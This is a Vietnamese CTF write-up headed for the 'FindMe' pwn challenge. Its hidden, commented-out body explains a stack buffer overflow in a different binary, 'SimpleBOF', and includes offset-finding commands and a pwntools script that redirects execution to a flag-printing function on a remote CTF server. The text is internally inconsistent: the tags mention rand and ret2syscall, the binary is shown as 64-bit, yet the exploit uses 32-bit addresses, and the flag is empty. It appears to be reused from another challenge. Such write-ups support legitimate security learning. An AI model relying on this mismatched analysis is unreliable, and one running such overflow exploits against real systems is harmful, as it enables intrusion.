## ⚡ [FindMe](https://ctf.hcmus.edu.vn/challenges#FindMe)

[![df](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)
[![df](https://img.shields.io/badge/member-viplazy-brightgreen.svg)](https://img.shields.io/badge/member-viplazy-brightgreen.svg)
[![df](https://img.shields.io/badge/108-pts-brightgreen.svg)](https://img.shields.io/badge/108-pts-brightgreen.svg)

Tác giả: `pakkunandy`


Tags: `pwn` `bof` `rand` `ret2syscall`

<!--
### Challenge Description
-->

### Summary
<!--
Đây là challenge về buffer overflow.

Đầu tiên, kiểm tra thông tin binary:

```bash
$ checksec findme
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Chương trình này chạy trên nhân x64, đã tắt hầu hết các bảo vệ.

Mở chương trình với **IDA**, ta kiểm tra hàm **main**:

```cpp
int main()
{
  ...
  char bof[64]; // [sp+0h] [bp-4Ch]@1
  ...

  clean();
  __isoc99_scanf("%s", bof);
  ...
  return 0;
}
```
Lỗ hổng xảy ra ở hàm `scanf` khi chương trình cố gắng đọc vào vùng nhớ `bof` trên stack nhưng lại không giới hạn số lượng kí tự nhập.



```cpp 
void success()
{
  char flag[64]; // [sp+Ch] [bp-4Ch]@4
  FILE *fp; // [sp+4Ch] [bp-Ch]@1

  fp = fopen("flag.txt", (const char *)&unk_8048810);
  if ( !fp )
  {
    puts("File not found?, please contact admin");
    exit(0);
  }
  fgets(flag, 64, fp);
  fclose(fp);
  puts(flag);
}
```
Ta dễ thấy thêm hàm **success**, dùng để in ra flag của challenge.

Như vậy, để tới được hàm trên, ta sẽ lợi dụng lỗ hổng stack overflow để ghi đè địa chỉ trả về của hàm **main** trên stack thành địa chỉ của hàm **success** và lấy flag.

### Exploit

- Tìm vị trí địa chỉ trả về của hàm main
    ```bash
    $ python -c 'print "A"*64 + "BBBB"' | strace ./SimpleBOF
    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
    +++ killed by SIGSEGV (core dumped) +++
    Segmentation fault (core dumped)
    ```
    Như vậy, sau **64** bytes offset thì địa chỉ trả về của hàm main (si_addr) bị ghi đè thành "BBBB" (là giá trị địa chỉ lệnh không hợp lệ dẫn đến break chương trình).




- Lấy địa chỉ của hàm **success**

    ```bash
    $ objdump -t SimpleBOF | grep success
    08048670 g     F .text  00000087              success
    ```

    Kết quả: **`0x08048670`**
- Local exploit
    
    Ta thay "BBBB" thành địa chỉ của hàm **success**, lưu ý chuẩn [Little Endian](https://en.wikipedia.org/wiki/Endianness)
    
    ```bash
    $ python -c 'print "A"*64 + "\x70\x86\x04\x08"' | ./SimpleBOF
    File not found?, please contact admin
    ```

    Thành công, ta chạy trên server và lấy flag thôi!

## Code

```python
#!/usr/bin/env python

from pwn import *

e = ELF("./SimpleBOF")
p = remote("159.65.13.76", 63001)

offset = 64
success_addr = e.sym["success"]

payload = 'A'*offset + p32(success_addr)

p.sendline(payload)
p.interactive()
```
-->

📫 Flag: **`HCMUS-CTF{}`**

---
*[Back to table of contents](../README.md)*
